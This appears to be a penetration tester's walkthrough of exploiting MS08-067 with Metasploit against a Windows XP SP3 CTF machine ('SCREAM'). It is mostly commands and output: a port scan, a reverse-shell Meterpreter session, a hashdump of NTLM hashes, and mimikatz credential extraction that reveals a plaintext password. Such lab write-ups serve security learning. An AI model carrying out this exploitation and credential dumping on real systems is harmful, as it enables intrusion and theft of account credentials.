
====================================================================================================================
Metasploit - MS08_067_NETAPI exploit
====================================================================================================================

An old and well known vulnerability with a stable exploit that was working well during my first security assessments in 2008/2009. 
Affected versions of Windows were at the time: Microsoft Windows 2000, Windows XP, Windows Vista, Windows Server 2003 and Windows Server 2008.


Example with a Windows XP SP3 from the old CTF 'SCREAM'
====================================================================================================================

Jeff@kali-Linux:~$ nmap 192.168.1.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 06:43 CEST
Nmap scan report for 192.168.1.4
Host is up (0.085s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2869/tcp open  icslap

Nmap done: 1 IP address (1 host up) scanned in 2.56 seconds


msf5 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.1.4      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:
   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 192.168.1.34:4444 
[*] 192.168.1.4:445 - Automatically detecting the target...
[*] 192.168.1.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.1.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.1.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 192.168.1.4
[*] Meterpreter session 1 opened (192.168.1.34:4444 -> 192.168.1.4:1079) at 2020-04-05 06:56:45 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeUndockPrivilege

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:504182f8417ed8557b67e96adc8b4d04:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:a03299a993da915ca9d82696d8625873:a8976221dea345e51ba030ddebc945b1:::
pentester:1004:1e99d771a164613ab6cb882f20962373:fe4b8e9e7da90982005360caf7a5be78:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:198b84b154680454ed6c56614542bf0e:::

meterpreter > 

meterpreter > load mimikatz
Loading extension mimikatz...Success.

meterpreter > help mimikatz
Mimikatz Commands
=================
    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds.
    livessp           Attempt to retrieve livessp creds.
    mimikatz_command  Run a custom command.
    msv               Attempt to retrieve msv creds (hashes).
    ssp               Attempt to retrieve ssp creds.
    tspkg             Attempt to retrieve tspkg creds.
    wdigest           Attempt to retrieve wdigest creds.


meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain        User             Password
------   -------    ------        ----             --------
0;35032  NTLM       SCREAM        alex             lm{ 00000000000000000000000000000000 }, ntlm{ 504182f8417ed8557b67e96adc8b4d04 }
0;996    Negotiate  NT AUTHORITY  NETWORK SERVICE  lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE    n.s. (Credentials KO)
0;26069  NTLM                                      n.s. (Credentials KO)
0;999    NTLM       WORKGROUP     SCREAM$          n.s. (Credentials KO)



meterpreter > mimikatz_command -f sekurlsa::logonPasswords

"0;35032","NTLM","alex","SCREAM","lm{ 00000000000000000000000000000000 }, ntlm{ 504182f8417ed8557b67e96adc8b4d04 }"thisisaverylongpassword""thisisaverylongpassword"
"0;997","Negotiate","LOCAL SERVICE","NT AUTHORITY","n.s. (Credentials KO)""""
"0;996","Negotiate","NETWORK SERVICE","NT AUTHORITY","lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }""""
"0;26069","NTLM","","","n.s. (Credentials KO)""""
"0;999","NTLM","SCREAM$","WORKGROUP","n.s. (Credentials KO)"
"
<SNIP>
